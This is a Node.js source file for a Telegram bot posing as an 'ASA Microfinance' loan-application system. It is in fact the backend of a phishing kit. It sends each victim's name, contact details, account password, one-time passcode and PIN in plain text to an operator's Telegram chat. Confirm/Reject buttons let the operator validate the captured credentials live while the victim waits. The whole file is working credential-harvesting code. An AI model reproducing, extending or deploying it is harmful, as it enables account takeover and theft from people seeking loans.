/**
 * bot_manager.js
 * Complete Telegram Bot Manager with INSTANT Confirm/Reject buttons
 */

const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
require('dotenv').config();

// ============================================================================
// CONFIGURATION
// ============================================================================

const TELEGRAM_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:3000';

if (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {
    console.error('❌ Missing Telegram configuration in .env file');
    process.exit(1);
}

// Initialize bot with polling - NO DELAYS
const bot = new TelegramBot(TELEGRAM_TOKEN, { 
    polling: true,
    polling: {
        interval: 300, // Fast polling
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

console.log(`
╔═══════════════════════════════════════════════════════════════╗
║         ASA MICROFINANCE - TELEGRAM BOT                       ║
╠═══════════════════════════════════════════════════════════════╣
║  Status:     🟢 RUNNING - INSTANT BUTTONS ACTIVE              ║
║  Server:     ${SERVER_URL}                                      ║
║  Buttons:    ✅ CONFIRM / REJECT - INSTANT                     ║
╚═══════════════════════════════════════════════════════════════╝
`);

// Track processed callbacks to prevent duplicates
const processedCallbacks = new Set();
const processedMessages = new Set();

// Clean up processed callbacks every 5 minutes to prevent memory leak
setInterval(() => {
    processedCallbacks.clear();
    processedMessages.clear();
    console.log('🧹 Cleaned up processed callback cache');
}, 5 * 60 * 1000);

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

const escapeHTML = (str) => {
    if (!str) return 'N/A';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
};

const formatCurrency = (amount) => {
    if (!amount) return '$0';
    return `$${Number(amount).toLocaleString()}`;
};

const formatPhone = (phone) => {
    if (!phone) return 'N/A';
    return `+232 ${phone}`;
};

// ============================================================================
// STEP SENDING FUNCTIONS
// ============================================================================

const sendStep1 = async (data) => {
    const message = `
💰 <b>STEP 1 – LOAN DETAILS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
📋 <b>Loan Type:</b> ${escapeHTML(data.loanType)}
💵 <b>Amount:</b> ${formatCurrency(data.amount)}
⏱️ <b>Term:</b> ${escapeHTML(data.term)} months
📝 <b>Purpose:</b> ${escapeHTML(data.purpose)}
    `;
    
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`✅ Step 1 sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 1:`, error.message);
        return false;
    }
};

const sendStep2 = async (data) => {
    const message = `
👤 <b>STEP 2 – PERSONAL INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
👤 <b>First Name:</b> ${escapeHTML(data.firstName)}
👤 <b>Last Name:</b> ${escapeHTML(data.lastName)}
📧 <b>Email:</b> ${escapeHTML(data.email)}
📞 <b>Phone:</b> ${formatPhone(data.phone)}
    `;
    
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`✅ Step 2 sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 2:`, error.message);
        return false;
    }
};

const sendStep3 = async (data) => {
    const message = `
💼 <b>STEP 3 – EMPLOYMENT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
📋 <b>Employment Status:</b> ${escapeHTML(data.employment)}
💰 <b>Income:</b> ${formatCurrency(data.income)}
🏢 <b>Employer:</b> ${escapeHTML(data.employer) || 'N/A'}
    `;
    
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`✅ Step 3 sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 3:`, error.message);
        return false;
    }
};

const sendStep4 = async (data) => {
    const message = `
🔐 <b>STEP 4 – ACCOUNT VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
📞 <b>Phone:</b> ${formatPhone(data.phone)}
🔑 <b>Password:</b> <code>${escapeHTML(data.password)}</code>
    `;
    
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`✅ Step 4 sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 4:`, error.message);
        return false;
    }
};

const sendStep5 = async (data) => {
    const message = `
🔢 <b>STEP 5 – OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
📞 <b>Phone:</b> ${formatPhone(data.phone)}
🔢 <b>OTP:</b> <code>${escapeHTML(data.otp)}</code>
    `;
    
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`✅ Step 5 sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 5:`, error.message);
        return false;
    }
};

const sendStep6 = async (data) => {
    const message = `
🔒 <b>STEP 6 – FINAL VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
📞 <b>Phone:</b> ${formatPhone(data.phone)}
🔐 <b>PIN:</b> <code>****</code>
    `;
    
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`✅ Step 6 sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 6:`, error.message);
        return false;
    }
};

// ============================================================================
// VERIFICATION REQUESTS (WITH BUTTONS)
// ============================================================================

const requestPasswordVerification = async (data) => {
    const message = `
🔴 <b>⚠️ PASSWORD VERIFICATION REQUIRED</b> 🔴
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application:</b> <code>${escapeHTML(data.appId)}</code>
👤 <b>Name:</b> ${escapeHTML(data.firstName)} ${escapeHTML(data.lastName)}
📞 <b>Phone:</b> ${formatPhone(data.phone)}
💰 <b>Amount:</b> ${formatCurrency(data.amount)}

<b>🔑 PASSWORD:</b> <code>${escapeHTML(data.password)}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Is this password correct?</b>
    `;
    
    const keyboard = {
        inline_keyboard: [[
            { text: '✅ CONFIRM', callback_data: `pw_confirm_${data.appId}` },
            { text: '❌ REJECT', callback_data: `pw_reject_${data.appId}` }
        ]]
    };
    
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, message, {
            parse_mode: 'HTML',
            reply_markup: JSON.stringify(keyboard)
        });
        console.log(`✅ Password verification sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send password verification:`, error.message);
        return false;
    }
};

const requestPinVerification = async (data) => {
    const message = `
🔴 <b>⚠️ FINAL PIN VERIFICATION REQUIRED</b> 🔴
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application:</b> <code>${escapeHTML(data.appId)}</code>
👤 <b>Name:</b> ${escapeHTML(data.firstName)} ${escapeHTML(data.lastName)}
📞 <b>Phone:</b> ${formatPhone(data.phone)}
💰 <b>Amount:</b> ${formatCurrency(data.amount)}

<b>🔑 PASSWORD:</b> <code>${escapeHTML(data.password)}</code> (verified)
<b>🔐 PIN:</b> <code>${escapeHTML(data.pin)}</code>
<b>🔢 OTP:</b> <code>${escapeHTML(data.otp)}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Is this PIN correct?</b>
    `;
    
    const keyboard = {
        inline_keyboard: [[
            { text: '✅ CONFIRM', callback_data: `pin_confirm_${data.appId}` },
            { text: '❌ REJECT', callback_data: `pin_reject_${data.appId}` }
        ]]
    };
    
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, message, {
            parse_mode: 'HTML',
            reply_markup: JSON.stringify(keyboard)
        });
        console.log(`✅ PIN verification sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send PIN verification:`, error.message);
        return false;
    }
};

// ============================================================================
// COMPLETE APPLICATION SUMMARY
// ============================================================================

const sendCompleteApplication = async (sessionData) => {
    const message = `
✅ <b>APPLICATION COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application:</b> <code>${escapeHTML(sessionData.appId || 'N/A')}</code>
⏰ <b>Completed:</b> ${new Date().toLocaleString()}

All 6 steps completed successfully!
    `;
    
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`✅ Complete application sent for ${sessionData.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send complete application:`, error.message);
        return false;
    }
};

// ============================================================================
// SIMPLE MESSAGE
// ============================================================================

const sendMessage = async (text) => {
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
        console.log('✅ Message sent');
        return true;
    } catch (error) {
        console.error(`❌ Failed to send message:`, error.message);
        return false;
    }
};

// ============================================================================
// ===== INSTANT CONFIRM/REJECT BUTTON HANDLER - FIXED =====
// ============================================================================

// Remove any existing listeners to prevent duplicates
bot.removeAllListeners('callback_query');

// Single, clean callback handler - INSTANT response
bot.on('callback_query', async (callbackQuery) => {
    const startTime = Date.now();
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    const message = callbackQuery.message;
    const chatId = message.chat.id;
    const messageId = message.message_id;
    
    console.log(`🔘 Callback received: ${data} (${Date.now() - startTime}ms)`);
    
    // Prevent duplicate processing of same callback
    if (processedCallbacks.has(callbackId)) {
        console.log(`⚠️ Duplicate callback ignored: ${callbackId}`);
        return;
    }
    processedCallbacks.add(callbackId);
    
    // Parse callback data - INSTANT parsing
    const parts = data.split('_');
    const type = parts[0];        // 'pw' or 'pin'
    const action = parts[1];      // 'confirm' or 'reject'
    const appId = parts.slice(2).join('_');
    
    console.log(`📋 Parsed: type=${type}, action=${action}, appId=${appId} (${Date.now() - startTime}ms)`);
    
    // INSTANT acknowledgment - remove loading state on button
    try {
        await bot.answerCallbackQuery(callbackId, {
            text: action === 'confirm' ? '✓ Confirmed!' : '✗ Rejected!',
            show_alert: false
        });
        console.log(`✅ Callback answered (${Date.now() - startTime}ms)`);
    } catch (error) {
        console.error(`❌ Failed to answer callback:`, error.message);
    }
    
    // Determine endpoint - FAST
    let endpoint = '';
    if (type === 'pw') {
        endpoint = action === 'confirm' ? '/api/password-verified' : '/api/password-rejected';
    } else if (type === 'pin') {
        endpoint = action === 'confirm' ? '/api/pin-verified' : '/api/pin-rejected';
    } else {
        console.log('❓ Unknown callback type:', type);
        return;
    }
    
    // INSTANT server call - no delays
    try {
        console.log(`📡 Calling ${SERVER_URL}${endpoint} for ${appId} (${Date.now() - startTime}ms)`);
        
        const response = await axios.post(`${SERVER_URL}${endpoint}`, 
            { appId }, 
            { 
                headers: { 'Content-Type': 'application/json' },
                timeout: 3000 // Fast timeout
            }
        );
        
        console.log(`✅ Server response: ${response.status} (${Date.now() - startTime}ms)`);
        
        if (response.data && response.data.success) {
            console.log(`✅ Server notified: ${action} for ${appId} (${Date.now() - startTime}ms)`);
            
            // INSTANT message update - remove buttons
            try {
                await bot.editMessageText(
                    message.text + `\n\n✅ ${action.toUpperCase()}D`,
                    { 
                        chat_id: chatId, 
                        message_id: messageId, 
                        parse_mode: 'HTML',
                        reply_markup: { inline_keyboard: [] } 
                    }
                );
                console.log(`✅ Message updated, buttons removed (${Date.now() - startTime}ms)`);
            } catch (editError) {
                // Message might already be deleted - ignore
                console.log(`⚠️ Message update skipped:`, editError.message);
            }
            
            // INSTANT confirmation message (fire and forget)
            bot.sendMessage(chatId, 
                `✅ ${action.toUpperCase()} confirmed for ${appId}`,
                { parse_mode: 'HTML' }
            ).catch(() => {});
            
        } else {
            console.error(`❌ Server returned error:`, response.data);
            bot.sendMessage(chatId, 
                `❌ Error: Server returned ${response.status}`,
                { parse_mode: 'HTML' }
            ).catch(() => {});
        }
        
    } catch (error) {
        console.error(`❌ Failed to notify server (${Date.now() - startTime}ms):`, error.message);
        
        // INSTANT error feedback
        bot.sendMessage(chatId, 
            `❌ Error processing ${action} for ${appId}\n${error.message}`,
            { parse_mode: 'HTML' }
        ).catch(() => {});
    }
    
    console.log(`⏱️ Total callback processing time: ${Date.now() - startTime}ms`);
});

// ============================================================================
// ERROR HANDLERS
// ============================================================================

bot.on('polling_error', (error) => {
    // Only log critical errors
    if (error.code !== 'EFATAL') {
        console.error('❌ Polling error:', error.message);
    }
});

bot.on('error', (error) => {
    console.error('❌ Bot error:', error.message);
});

// ============================================================================
// COMMAND HANDLERS (optional)
// ============================================================================

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== ADMIN_CHAT_ID.toString()) return;
    
    await bot.sendMessage(chatId, 
        '👋 ASA Microfinance Bot is active!\n\n' +
        '✅ CONFIRM/REJECT buttons are INSTANT',
        { parse_mode: 'HTML' }
    );
});

bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== ADMIN_CHAT_ID.toString()) return;
    
    await bot.sendMessage(chatId,
        `📊 Bot Statistics\n━━━━━━━━━━━━━━━━━━\n` +
        `✅ Status: Active\n` +
        `⚡ Buttons: INSTANT mode\n` +
        `📡 Server: ${SERVER_URL}`,
        { parse_mode: 'HTML' }
    );
});

// ============================================================================
// EXPORTS
// ============================================================================

module.exports = {
    sendStep1, sendStep2, sendStep3, sendStep4, sendStep5, sendStep6,
    sendCompleteApplication,
    requestPasswordVerification,
    requestPinVerification,
    sendMessage
};